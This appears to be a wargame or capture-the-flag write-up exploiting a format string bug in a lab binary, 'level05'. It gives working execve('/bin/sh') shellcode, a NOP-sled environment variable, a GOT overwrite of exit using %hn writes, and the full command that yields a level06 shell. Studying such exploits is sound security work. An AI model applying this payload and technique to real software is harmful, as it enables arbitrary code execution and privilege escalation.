
# Level05 - Exploiting Format String Vulnerability to Execute Shellcode

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level05
coucou
coucou
```

The program prompts for input twice.

## Step 2: Analyzing with GDB

To understand the program, let's analyze it using GDB (GNU Debugger). The program uses `fgets()` to read input into a buffer of 100 characters, converts the input to lowercase, and finally calls `printf()` with the buffer as an argument:

```assembly
0x08048500 <+188>: lea    eax,[esp+0x28]   ; buffer
0x08048504 <+192>: mov    DWORD PTR [esp],eax
0x08048507 <+195>: call   0x8048340 <printf@plt>
```

This setup introduces a format string vulnerability.

## Step 3: Exploiting the Format String

Test the vulnerability by printing stack values:

```bash
$ python -c 'print "BBBB" + "-%x" * 12' | ./level05
bbbb-64-f7fcfac0-f7ec3af9-ffffd5ff-ffffd5fe-0-ffffffff-ffffd684-f7fdb000-62626262-2d78252d-252d7825
```

Our input appears at the 10th position on the stack.

## Step 4: Injecting Shellcode

To exploit this, store shellcode in an environment variable and inject it at the 10th position using the format string.

### Shellcode

Use the following shellcode:

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

### Find the Address of the Payload

Store the shellcode in an environment variable:

```bash
$ env -i PAYLOAD=$(python -c 'print "\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
(gdb) x/200s environ
```

### Locate the Environment Variable Address

Identify the address of the nopesled to jump to, e.g., `0xffffdc59`.

## Step 5: Overwriting the GOT Entry

We need to overwrite a GOT entry. Since the program ends with `exit()`, we can overwrite it:

```assembly
0x0804850c <+200>: mov    DWORD PTR [esp],0x0
0x08048513 <+207>: call   0x8048370 <exit@plt>
```

The GOT address of `exit` is `0x80497e0`.

### Building the Exploit

Split the address `0xffffdc59` into two writes for the GOT:

1. First part: `dc59` (56409 - 8 bytes for addresses).
2. Second part: `ffff` (65535 - remaining characters).

Construct the payload:

```bash
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401d" + "%10$hn" + "%9126d" + "%11$hn"'
```

## Step 6: Running the Exploit

Run the exploit with the environment variable:

```bash
$ (python3 -c 'print((b"\xe0\x97\x04\x08" + b"\xe2\x97\x04\x08" + b"%56401d" + b"%10$hn" + b"%9126d" + b"%11$hn").decode("latin-1")); cat') | env -i PAYLOAD=$(python3 -c 'print((b"\x90"*1000 + b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh").decode("latin-1"))') ./level05

whoami
level06
```

## Summary

- The program has a format string vulnerability that allows arbitrary memory writes.
- By injecting shellcode into an environment variable and using the format string, we can hijack execution.
- Overwriting the GOT entry for `exit` with the shellcode address enables us to execute arbitrary code.

This demonstrates how format string vulnerabilities can lead to full code execution if properly exploited.
